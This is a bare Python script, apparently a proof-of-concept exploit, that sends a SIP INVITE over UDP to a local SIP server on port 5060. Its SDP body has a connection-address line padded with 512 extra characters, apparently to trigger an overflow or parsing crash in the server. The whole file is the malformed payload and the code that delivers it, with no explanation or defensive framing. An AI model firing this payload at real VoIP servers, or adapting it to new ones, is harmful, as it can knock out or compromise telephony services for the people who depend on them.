import socket

sdp="v=0\r\n" + \
    "o=- 1600157102 1600157102 IN IP4 127.0.0.1\r\n" + \
    "s=-\r\n" + \
    "c=IN IP4 127.0.0.1%s\r\n" % ('1' * 512) + \
    "t=0 0\r\n" + \
    "m=audio 9999 RTP/AVP 8 0 96 101\r\n" + \
    "a=rtpmap:8 PCMA/8000/1\r\n" + \
    "a=rtpmap:0 PCMU/8000/1\r\n" + \
    "a=rtpmap:96 opus/96000/2\r\n" + \
    "a=rtpmap:101 telephone-event/8000/1\r\n" + \
    "a=sendrecv"

sip_msg="INVITE sip:bob_1@127.0.0.1:5060 SIP/2.0\r\n" + \
    "Via: SIP/2.0/UDP 127.0.0.1:40111;rport;branch=z9hG4bK-a\r\n" + \
    "Max-Forwards: 70\r\n" + \
    "From: <sip:bob_1@127.0.0.1:5060>;tag=3Ewqeuo81F1Hjvtg\r\n" + \
    "To: <sip:bob_1@127.0.0.1:5060>\r\n" + \
    "Call-ID: maooZ4nDzmArTBkT\r\n" + \
    "CSeq: 1020 INVITE\r\n" + \
    "Contact: <sip:bob_1@127.0.0.1:40111;transport=udp>\r\n" + \
    "Content-Length: %i\r\n" % len(sdp) + \
    "Content-Type: application/sdp\r\n" + \
    "\r\n" + \
    sdp

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
sock.sendto(sip_msg.encode(), ("127.0.0.1", 5060))